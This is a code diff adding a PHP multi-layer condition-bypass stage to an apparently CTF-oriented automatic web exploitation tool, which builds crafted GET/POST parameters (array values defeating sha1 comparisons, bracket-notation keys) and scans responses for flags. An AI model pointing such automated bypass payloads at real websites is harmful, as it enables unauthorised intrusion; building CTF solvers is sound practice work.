@@ -23,6 +23,10 @@ import time
 import json as _json
 import threading
 import base64
+import html as _html
+
+# v3.1 PHP Logic Analyzer
+from yang_web.core.php_logic import analyze_and_solve as _php_logic_solve
 
 
 # ============================================================================
@@ -163,6 +167,8 @@ class SmartFingerprinter:
                 if not any(p['name'] == name for p in result['php_params']):
                     result['php_params'].append({'name': name, 'method': method})
 
+        # Store clean source for PHP logic analysis
+        result['_clean_source'] = clean_body2
         self.last_results = result
         return result
 
@@ -1116,6 +1122,117 @@ FLAG_RE = re.compile(
 )
 
 
+def _execute_php_bypass(url: str, bypass_plan: Dict,
+                       on_progress=None, on_found=None) -> Dict:
+    """Execute PHP multi-layer condition bypass.
+    
+    Constructs GET/POST params from the bypass plan and sends the request.
+    """
+    t0 = time.time()
+    get_params = bypass_plan.get('get_params', {})
+    post_params = bypass_plan.get('post_params', {})
+    
+    if on_progress:
+        try:
+            on_progress('bypass', f'{bypass_plan.get("solved_layers",0)}/{bypass_plan.get("total_layers",0)}层', '构建绕过payload...')
+        except Exception:
+            pass
+    
+    # Build URL with GET params
+    from urllib.parse import urlencode, urlparse, urlunparse
+    parsed = urlparse(url)
+    get_query = dict(parse_qs(parsed.query, keep_blank_values=True))
+    
+    # Build POST body with manual encoding (support bracket notation)
+    post_parts = []
+    for key, val in post_params.items():
+        if val == '__ARRAY__':
+            # Array params for sha1 collision: qw->qw[]=a, yxx->yxx[]=b
+            if key == '__ARRAY_PARAMS__':
+                post_parts.append(('qw[]', 'a'))
+                post_parts.append(('yxx[]', 'b'))
+        elif val == '__ANY__':
+            post_parts.append((key + '[]', 'a'))
+        elif val == '__POST_DOT_KEY__':
+            # Dot key bypass: send bracket notation
+            post_parts.append((key, 'Happy to see you!'))
+        else:
+            post_parts.append((key, val))
+    
+    # Build URL with GET params (including bypass params)
+    from urllib.parse import quote
+    get_list = []
+    for k, vals in get_query.items():
+        for v in vals:
+            get_list.append(f'{k}={quote(v, safe="")}')
+    for k, v in get_params.items():
+        get_list.append(f'{k}={quote(v, safe="")}')
+    
+    if get_list:
+        full_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
+                                parsed.params, '&'.join(get_list), parsed.fragment))
+    else:
+        full_url = url
+    
+    # Encode POST body
+    post_body = '&'.join(f'{quote(k, safe="")}={quote(v, safe="")}' for k, v in post_parts).encode('utf-8')
+    
+    if on_progress:
+        try:
+            on_progress('bypass', '发送绕过请求', f'GET: {len(get_params)} params, POST: {len(post_parts)} params')
+        except Exception:
+            pass
+    
+    # Send request
+    resp = send_request(full_url, method='POST' if post_body else 'GET',
+                        post_data=post_body if post_body else None)
+    
+    elapsed = int((time.time() - t0) * 1000)
+    
+    if resp.get('ok'):
+        body = resp.get('body', '')
+        # Search for flag patterns
+        flags = FLAG_RE.findall(body)
+        if flags:
+            flag = flags[0]
+            if on_found:
+                try:
+                    on_found(flag)
+                except Exception:
+                    pass
+            if on_progress:
+                try:
+                    on_progress('flag', 'FLAG!', flag[:60])
+                except Exception:
+                    pass
+            return {
+                'flag': flag,
+                'vuln_confirmed': [{'type': 'PHP_BYPASS', 'method': 'GET+POST',
+                                     'payload': str(get_params) + ' | ' + str(post_parts)}],
+                'attacks_run': 1,
+                'stages': ['php_bypass', 'flag_found'],
+                'timing_ms': elapsed,
+            }
+        
+        # No flag found, check response text
+        text = _html.unescape(re.sub(r'<[^>]+>', '', body))
+        idx = text.find('?>')
+        text = text[idx+2:].strip() if idx > 0 else text[:200]
+        if on_progress:
+            try:
+                on_progress('bypass', '响应', text[:80])
+            except Exception:
+                pass
+    
+    return {
+        'flag': None,
+        'vuln_confirmed': [],
+        'attacks_run': 1,
+        'stages': ['php_bypass', 'no_flag'],
+        'timing_ms': elapsed,
+    }
+
+
 def auto_exploit(url, results, on_progress=None, on_found=None, fingerprint=None):
     """v3.0 自动解题 — 并发引擎 + 自适应调度 + 智能提权.
 
@@ -1137,6 +1254,15 @@ def auto_exploit(url, results, on_progress=None, on_found=None, fingerprint=None
     vuln_confirmed = []
     attacks_run = 0
     stages = []
+
+    # ── v3.1: PHP Bypass routing ──
+    for r in results:
+        if r.get('type') == 'PHP_BYPASS':
+            bypass_plan = r.get('_bypass_plan')
+            if bypass_plan:
+                return _execute_php_bypass(url, bypass_plan,
+                                            on_progress=on_progress,
+                                            on_found=on_found)
 
     def _found_once(flag):
         """Ensure on_found is called exactly once."""
@@ -1463,6 +1589,29 @@ def analyze_url(url: str) -> Dict:
                 "reasons": info["reasons"], "params": list(info["params"]),
                 "payloads": pls,
             })
+        
+        # ── v3.1: PHP Logic Analyzer — detect multi-layer bypass challenges ──
+        php_bypass_plan = None
+        if fp_result:
+            php_source = fp_result.get('_clean_source', '')
+            if php_source and ('if (' in php_source or 'if(' in php_source):
+                try:
+                    php_bypass_plan = _php_logic_solve(url, php_source, fingerprint=fp_result)
+                    if php_bypass_plan and php_bypass_plan.get('total_layers', 0) >= 2:
+                        # Add as a new vulnerability type
+                        results.insert(0, {
+                            "type": "PHP_BYPASS",
+                            "type_cn": "PHP多层绕过",
+                            "emoji": "\U0001F9E9",
+                            "confidence": 100,
+                            "reasons": [f"检测到{php_bypass_plan['solved_layers']}/{php_bypass_plan['total_layers']}层条件绕过"],
+                            "params": [],
+                            "payloads": [],
+                            "_bypass_plan": php_bypass_plan,  # Internal use
+                        })
+                except Exception:
+                    pass
+        
         return {
             "url": url,
             "parsed": {"scheme": parsed.scheme, "host": host,
@@ -1476,6 +1625,7 @@ def analyze_url(url: str) -> Dict:
             },
             "crawl": cr if (cr and cr.get("ok")) else None,
             "fingerprint": fp_result,
+            "php_bypass": php_bypass_plan,  # v3.1
             "error": None,
         }
     except Exception as ex:
